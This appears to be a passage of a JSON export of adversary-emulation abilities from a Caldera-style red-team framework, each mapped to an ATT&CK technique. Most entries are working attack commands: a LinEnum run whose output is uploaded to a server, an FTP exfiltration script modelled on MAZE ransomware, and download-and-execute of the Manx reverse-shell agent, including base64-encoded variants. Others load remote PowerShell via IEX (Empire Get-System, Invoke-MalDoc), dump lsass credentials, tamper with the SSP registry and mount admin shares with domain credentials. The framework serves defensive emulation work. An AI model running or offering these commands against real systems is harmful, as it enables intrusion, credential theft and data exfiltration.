        "name": "Leverage Procdump for lsass memory",
        "tactic": "credential-access",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "46098c66-8d9a-4d23-8a95-dd5021c385ae",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Information Discovery",
        "technique_id": "T1082",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm ./LinEnum.sh;\nrm /tmp/exfil.txt;"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Download and execute LinEnum.sh",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Linux Enumeration & Privilege Escalation Discovery Script",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "52177cc1-b9ab-4411-ac21-2eadc4b5d3b8",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "technique_id": "T1083",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ls",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ls",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "dir",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "List contents of current directory",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "List Directory",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "bed8f28e-c0ed-463e-9e31-d5607e5473df",
        "buckets": [
            "build-capabilities"
        ],
        "privilege": "",
        "technique_name": "Build or acquire exploits",
        "technique_id": "T1349",
        "executors": [
            {
                "timeout": 1000,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "msfconsole -r msf_extract.rc #{app.contact.http} #{app.api_key.red}",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "msf_extract.rc"
                ],
                "uploads": []
            },
            {
                "timeout": 1000,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "msfconsole -r msf_extract.rc #{app.contact.http} #{app.api_key.red}",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "msf_extract.rc"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Load Metasploit Abilities",
        "plugin": "access",
        "singleton": false,
        "delete_payload": true,
        "name": "Load Metasploit Abilities",
        "tactic": "build-capabilities",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "a41c2324-8c63-4b15-b3c5-84f920d1f226",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "technique_id": "T1083",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "find ~ -type f -name #{host.print.file} 2>/dev/null",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.system.path",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "find ~ -type f -name #{host.print.file} 2>/dev/null",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.system.path",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Locate file that appears in the printer queue",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Locate file from printer queue",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "4b3621d08052231fa6a8b7ed2c226085",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Trusted Developer Utilities Proxy Execution",
        "technique_id": "T1127",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "del %TEMP%\\LibHello.js && del %TEMP%\\LibHello.dll"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "copy 5bdafa_LibHello.js %TEMP%\\LibHello.js && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe /t:library %TEMP%\\LibHello.js",
                "name": "cmd",
                "parsers": [],
                "payloads": [
                    "5bdafa_LibHello.js"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Use jsc.exe to compile javascript code stored in Library.js and output Library.dll.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Lolbin Jsc.exe compile javascript to dll",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "88912e0453c2cbd1c75d1c49f815d17f",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Trusted Developer Utilities Proxy Execution",
        "technique_id": "T1127",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "del %TEMP%\\hello.js && del %TEMP%\\hello.exe"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "copy a25c19_hello.js %TEMP%\\hello.js && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe %TEMP%\\hello.js",
                "name": "cmd",
                "parsers": [],
                "payloads": [
                    "a25c19_hello.js"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Lolbin Jsc.exe compile javascript to exe",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "ee065bea223fde249a30f60c0d05e36d",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
        "technique_id": "T1048.003",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "$ftp = \"ftp://#{ftp_server}/\"; try {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\")); {$uri = New-Object System.Uri($ftp+$file.name);  $ftp_del = [System.Net.FtpWebRequest]::create($uri);  $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}');  $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile;  $ftp_del.GetResponse()}} catch{}"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$Dir_to_copy = \"$env:windir\\temp\"; $ftp = \"ftp://#{ftp_server}/\"; $web_client = New-Object System.Net.WebClient; $web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}'); if (test-connection -count 1 -computername \"#{ftp_server}\" -quiet); {foreach($file in (dir $Dir_to_copy \"*.7z\")); {echo \"Uploading $file...\"; $uri = New-Object System.Uri($ftp+$file.name); $web_client.UploadFile($uri, $file.FullName)}}; else; {echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "MAZE FTP Upload",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "f6297d156d5b30fbef5212ac5f1f76ee",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "technique_id": "T1204.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Maldoc choice flags command execution",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "356d1722-7784-40c4-822b-0cf864b0b36d",
        "buckets": [
            "command-and-control"
        ],
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "technique_id": "T1105",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [
                    {
                        "description": "Run against the UDP contact",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMSI7Y29udGFjdD0idWRwIjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gbWFueC5nbztjaG1vZCAreCBtYW54LmdvOy4vbWFueC5nbyAtaHR0cCAkc2VydmVyIC1zb2NrZXQgJHNvY2tldCAtY29udGFjdCAkY29udGFjdCAtdg=="
                    },
                    {
                        "description": "Download with a random name and start as a background process",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMCI7Y29udGFjdD0idGNwIjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgJHNlcnZlci9maWxlL2Rvd25sb2FkIDI+JjEgfCBncmVwIC1pICJDb250ZW50LURpc3Bvc2l0aW9uIiB8IGdyZXAgLWlvICJmaWxlbmFtZT0uKiIgfCBjdXQgLWQnPScgLWYyIHwgdHIgLWQgJyJccicpICYmIGNobW9kICt4ICRhZ2VudCAyPi9kZXYvbnVsbDtub2h1cCAuLyRhZ2VudCAtaHR0cCAkc2VydmVyIC1zb2NrZXQgJHNvY2tldCAtY29udGFjdCAkY29udGFjdCAm"
                    }
                ],
                "command": "server=\"#{app.contact.http}\";\nsocket=\"#{app.contact.tcp}\";\ncontact=\"tcp\";\ncurl -s -X POST -H \"file:manx.go\" -H \"platform:darwin\" $server/file/download > manx.go;\nchmod +x manx.go;\n./manx.go -http $server -socket $socket -contact $contact -v",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [
                    {
                        "description": "Run against the UDP contact",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMSI7Y29udGFjdD0idWRwIjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1odHRwICRzZXJ2ZXIgLXNvY2tldCAkc29ja2V0IC1jb250YWN0ICRjb250YWN0ICY="
                    },
                    {
                        "description": "Download with a random name and start as a background process",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMCI7Y29udGFjdD0idGNwIjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1odHRwICRzZXJ2ZXIgLXNvY2tldCAkc29ja2V0IC1jb250YWN0ICRjb250YWN0ICY="
                    }
                ],
                "command": "server=\"#{app.contact.http}\";\nsocket=\"#{app.contact.tcp}\";\ncontact=\"tcp\";\ncurl -s -X POST -H \"file:manx.go\" -H \"platform:linux\" $server/file/download > manx.go;\nchmod +x manx.go;\n./manx.go -http $server -socket $socket -contact $contact -v",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [
                    {
                        "description": "Run against the UDP contact",
                        "command": "aWYgKCRob3N0LlZlcnNpb24uTWFqb3IgLWdlIDMpeyRFcnJBY3Rpb249ICJpZ25vcmUifWVsc2V7JEVyckFjdGlvbj0gIlNpbGVudGx5Q29udGludWUifTskc2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijskc29ja2V0PSIwLjAuMC4wOjcwMTEiOyRjb250YWN0PSJ1ZHAiOyR1cmw9IiRzZXJ2ZXIvZmlsZS9kb3dubG9hZCI7JHdjPU5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHdjLkhlYWRlcnMuYWRkKCJwbGF0Zm9ybSIsIndpbmRvd3MiKTskd2MuSGVhZGVycy5hZGQoImZpbGUiLCJtYW54LmdvIik7JGRhdGE9JHdjLkRvd25sb2FkRGF0YSgkdXJsKTskbmFtZT0kd2MuUmVzcG9uc2VIZWFkZXJzWyJDb250ZW50LURpc3Bvc2l0aW9uIl0uU3Vic3RyaW5nKCR3Yy5SZXNwb25zZUhlYWRlcnNbIkNvbnRlbnQtRGlzcG9zaXRpb24iXS5JbmRleE9mKCJmaWxlbmFtZT0iKSs5KS5SZXBsYWNlKCJgIiIsIiIpO0dldC1Qcm9jZXNzIHwgPyB7JF8uUGF0aCAtbGlrZSAiQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSJ9IHwgc3RvcC1wcm9jZXNzIC1mIC1lYSAkRXJyQWN0aW9uO3JtIC1mb3JjZSAiQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSIgLWVhICRFcnJBY3Rpb247KFtpby5maWxlXTo6V3JpdGVBbGxCeXRlcygiQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSIsJGRhdGEpKSB8IE91dC1OdWxsO1N0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoIEM6XFVzZXJzXFB1YmxpY1wkbmFtZS5leGUgLUFyZ3VtZW50TGlzdCAiLXNvY2tldCAkc29ja2V0IC1odHRwICRzZXJ2ZXIgLWNvbnRhY3QgJGNvbnRhY3QiIC1XaW5kb3dTdHlsZSBoaWRkZW47"
                    }
                ],
                "command": "if ($host.Version.Major -ge 3){$ErrAction= \"ignore\"}else{$ErrAction= \"SilentlyContinue\"};\n$server=\"#{app.contact.http}\";\n$socket=\"#{app.contact.tcp}\";\n$contact=\"tcp\";\n$url=\"$server/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"manx.go\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\nGet-Process | ? {$_.Path -like \"C:\\Users\\Public\\$name.exe\"} | stop-process -f -ea $ErrAction;\nrm -force \"C:\\Users\\Public\\$name.exe\" -ea $ErrAction;\n([io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data)) | Out-Null;\nStart-Process -FilePath C:\\Users\\Public\\$name.exe -ArgumentList \"-socket $socket -http $server -contact $contact\" -WindowStyle hidden;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "A reverse-shell agent which communicates via the TCP contact",
        "plugin": "manx",
        "singleton": false,
        "delete_payload": true,
        "name": "Manx",
        "tactic": "command-and-control",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3c647015-ab0a-496a-8847-6ab173cd2b22",
        "buckets": [
            "credential-access"
        ],
        "privilege": "",
        "technique_name": "OS Credential Dumping",
        "technique_id": "T1003",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "if (Test-Path \"C:\\Users\\Public\\creds.dmp\") {\n  rm \"C:\\Users\\Public\\creds.dmp\" -Force;\n};"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": ".\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "totallylegit.exe"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Custom GO credential dumper using minidumpwritedump",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "MiniDumpWriteDump (Spooky)",
        "tactic": "credential-access",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.process.id"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "09f4739a13a4caf3b66b86aac880e3c0",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Security Support Provider",
        "technique_id": "T1547.005",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$SecurityPackages = Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'; $SecurityPackagesUpdated = $SecurityPackages; $SecurityPackagesUpdated += \"not-a-ssp\"; Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated; Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackages",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Modify SSP configuration in registry",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "aa6ec4dd-db09-4925-b9b9-43adeb154686",
        "buckets": [
            "lateral-movement"
        ],
        "privilege": "",
        "technique_name": "Remote Services: SMB/Windows Admin Shares",
        "technique_id": "T1021.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "net use \\\\#{remote.host.fqdn}\\C$ /delete"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{domain.user.name} #{domain.user.password}",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.share_mounted",
                        "parserconfigs": [
                            {
                                "edge": "has_share",
                                "target": "",
                                "source": "remote.host.fqdn",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Mount a windows share",
        "plugin": "stockpile",
        "singleton": true,
        "delete_payload": true,
        "name": "Mount Share",
        "tactic": "lateral-movement",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.not_exists",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_share"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.basic",
                "relationship_match": [
                    {
                        "source": "domain.user.name",
                        "edge": "has_password",
                        "target": "domain.user.password"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.req_like",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_admin",
                        "target": "domain.user.name"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.reachable",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "isAccessibleFrom"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.no_backwards_movement",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "e5f9de8f-3df1-4e78-ad92-a784e3f6770d",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "PowerShell",
        "technique_id": "T1059.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Copy powershell to non-standard location and perform triage commands",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Move Powershell & triage",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "d16fd4e5-0f0d-4975-9af8-1166732ac0f3",
        "buckets": [],
        "privilege": "",
        "technique_name": "Port Scan NMap for Windows",
        "technique_id": "T1046",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "arp -a",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "nmap 127.0.0.1",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {
            "cleanup": "[]"
        },
        "access": {},
        "description": "Scan ports to check for listening ports for the local host 0.0.0.0",
        "plugin": "",
        "singleton": true,
        "delete_payload": true,
        "name": "NMAP",
        "tactic": "reconnaissance",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "567eaaba-94cc-4a27-83f8-768e5638f4e1",
        "buckets": [
            "technical-information-gathering"
        ],
        "privilege": "",
        "technique_name": "Conduct active scanning",
        "technique_id": "T1254",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "pwd",
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "victimIP=$(hostname -I); nmap -sS $victimIP",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Scan an external host for open ports and services",
        "plugin": "",
        "singleton": false,
        "delete_payload": true,
        "name": "NMAP scan",
        "tactic": "reconnaissance",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "d1bde9af5206152c9980a5b6adcc1813",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
        "technique_id": "T1134.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Named pipe client impersonation",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "40161ad0-75bd-11e9-b475-0800200c9a66",
        "buckets": [
            "lateral-movement"
        ],
        "privilege": "",
        "technique_name": "Remote Services: SMB/Windows Admin Shares",
        "technique_id": "T1021.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "net use \\\\#{remote.host.ip}\\c$ /delete;"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Mounts a network file share on a target computer",
        "plugin": "stockpile",
        "singleton": true,
        "delete_payload": true,
        "name": "Net use",
        "tactic": "lateral-movement",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "e8017c46-acb8-400c-a4b5-b3362b5b5baa",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "technique_id": "T1016",
        "executors": [
            {
